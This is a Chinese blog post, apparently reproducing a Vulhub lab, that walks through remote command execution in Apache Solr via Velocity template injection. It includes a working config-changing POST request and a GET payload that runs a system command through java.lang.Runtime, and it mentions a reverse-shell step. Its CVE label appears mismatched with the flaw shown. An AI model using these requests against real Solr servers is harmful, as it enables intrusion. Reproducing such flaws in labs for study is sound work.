# Apache solr 远程命令执行（CVE-2019-0193） - 我要变超人 - 博客园

> 原文：[`www.cnblogs.com/sup3rman/p/13359345.html`](https://www.cnblogs.com/sup3rman/p/13359345.html)

# solr 简介；

Solr 是一个独立的企业级搜索应用服务器，它对外提供类似于 Web-service 的 API 接口。用户可以通过 http 请求，向搜索引擎服务器提交一定格式的 XML 文件，生成索引；也可以通过 Http Get 操作提出查找请求，并得到 XML 格式的返回结果。

# 漏洞描述：

## 该漏洞的产生是由于两方面的原因：

### 当攻击者可以直接访问 Solr 控制台时，可以通过发送类似/节点名/config 的 POST 请求对该节点的配置文件做更改

### apache solr 默认继承 VelocityResponseWriter 插件，在该插件的初始化参数中的 params.resource.loader.enabled 这个选项是用来控制是否允许参数资源加载器在 solr 请求参数中指定模板，默认设置是 false。

### 当设置 params.resource.loader.enabled 时为 true 时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。

## 影响版本：
包括且不限于 8.2.0（最新版本）

### 5.4.1/5.5.0

### 6.6.1/6.6.3

### 7.0.1/7.1.0/7.2.1/7.3.0/7.4.0/7.5.0/7.7.1/7.7.2

### 8.1.0/8.1.1/8.2.0

# 漏洞复现：

## docker 启动服务

> ### cd /vulhub/solr/CVE-2019-0193/
> 
> ### docker-compose up –d

## 创建一个结合

> ### docker-compose exec solr bash bin/solr create_core –c test –d example/example-DIH/solr/db

### 搭建好后默认端口为 8983，访问[`ip:8983 即可`](http://ip:8983 即可)

![image](https://img2020.cnblogs.com/blog/1943028/202007/1943028-20200722104755549-1733347707.png)

## 利用前提：攻击者需要知道 Solr 服务中 Core 的名称才能执行攻击，如上图所示 test 是 core 的名称

### 直接构造 POST 请求，在/solr/test/config 目录 POST 一下数据（修改 Core 的配置），开始 params.resource.loader.enabled

![image](https://img2020.cnblogs.com/blog/1943028/202007/1943028-20200722104756370-1737498177.png)

> ### 
> 
> POST /solr/test/config HTTP/1.1
> Host: 192.168.21.130:8983
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
> Accept-Language: en-US,en;q=0.5
> Connection: close
> Upgrade-Insecure-Requests: 1
> Cache-Control: max-age=0
> Content-Length: 259
> 
> {
>    "update-queryresponsewriter": {
>      "startup": "lazy",
>      "name": "velocity",
>      "class": "solr.VelocityResponseWriter",
>      "template.base.dir": "",
>      "solr.resource.loader.enabled": "true",
>      "params.resource.loader.enabled": "true"
>    }
> }

### 使用公开 exp

![image](https://img2020.cnblogs.com/blog/1943028/202007/1943028-20200722104756993-2097473024.png)

> ### GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
> 
> ### Host: 192.168.21.130:8983
> 
> ### Content-Length: 2

### 反弹 shell

### 执行命令 [`www.jackson-t.ca/runtime-exec-payloads.html`](http://www.jackson-t.ca/runtime-exec-payloads.html)

![image](https://img2020.cnblogs.com/blog/1943028/202007/1943028-20200722104757593-1462161604.png)

### 将生成的命令填入到 exp 中

### 监听端口

![image](https://img2020.cnblogs.com/blog/1943028/202007/1943028-20200722104758178-1869521029.png)